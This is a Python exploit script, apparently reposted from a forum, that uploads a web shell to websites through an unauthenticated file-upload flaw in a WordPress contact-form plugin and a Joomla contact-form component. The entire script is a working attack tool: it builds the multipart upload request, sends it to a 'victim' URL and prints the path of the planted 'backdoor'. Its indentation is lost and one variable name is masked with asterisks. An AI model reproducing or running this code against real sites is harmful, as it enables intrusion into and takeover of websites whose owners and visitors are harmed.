#!/usr/bin/python[/B][/CENTER]

import urllib, urllib2, sys, mimetypes
import optparse
import os, os.path

# Check url
def checkurl(url):
if url[:8] != "https://" and url[:7] != "http://":
print('[X] You must insert http:// or https:// procotol')
sys.exit(1)
else:
return url
# Check if file exists and has readable
def checkfile(file):
if not os.path.isfile(file) and not os.access(file, os.R_OK):
print '[X] '+file+' file is missing or not readable'
sys.exit(1)
else:
return file
# Get file's mimetype
def get_content_type(filename):
return mimetypes.guess_type(filename)[0] or 'application/octet-stream'

# Create multipart header
def create_body_sh3ll_upl04d(payloadname):

getfields = dict()

payloadcontent = open(payloadname).read()

LIMIT = '----------lImIt_of_THE_fIle_eW_$'
CRLF = '\r\n'

L = []
for (key, value) in getfields.items():
L.append('--' + LIMIT)
L.append('Content-Disposition: form-data; name="%s"' % key)
L.append('')
L.append(value)

L.append('--' + LIMIT)
L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', payloadname))
L.append('Content-Type: %s' % get_content_type(payloadname))
L.append('')
L.append(payloadcontent)
L.append('--' + LIMIT + '--')
L.append('')
body = CRLF.join(L)
return body

banner = """

"""

commandList = optparse.OptionParser('usage: %prog -t URL -c CMS-f FILENAME.PHP [--timeout sec]')
commandList.add_option('-t', '--target', action="store",
help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
)
commandList.add_option('-c', '--cms', action="store",
help="Insert CMS Type: wordpress|joomla",
)
commandList.add_option('-f', '--file', action="store",
help="Insert file name, ex: shell.php",
)
commandList.add_option('--timeout', action="store", default=10, type="int",
help="[Timeout Value] - Default 10",
)

options, remainder = commandList.parse_args()

# Check args
if not options.target or not options.file or not options.cms:
print(banner)
commandList.print_help()
sys.exit(1)

payloadname = checkfile(options.file)
host = checkurl(options.target)
timeout = options.timeout
cmstype = options.cms

print(banner)

if options.cms == "wordpress":
url_sexy_upload = host+'/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php'
backdoor_******** = host+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'

elif options.cms == "joomla":
url_sexy_upload = host+'/components/com_creativecontactform/fileupload/index.php'
backdoor_******** = host+'/components/com_creativecontactform/fileupload/files/'

else:
print("[X] -c options require: 'wordpress' or 'joomla'")
sys.exit(1)

content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

bodyupload = create_body_sh3ll_upl04d(payloadname)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
'content-type': content_type,
'content-length': str(len(bodyupload)) }

try:
req = urllib2.Request(url_sexy_upload, bodyupload, headers)
response = urllib2.urlopen(req)

if "error" in response.read():
print("[X] Upload Failed ")
else:
print("[!] Shell Uploaded")
print("[!] "+backdoor_********+options.file)
except urllib2.HTTPError as e:
print("[X] Http Error: "+str(e.code))
except urllib2.URLError as e:
print("[X] Connection Error: "+str(e.code))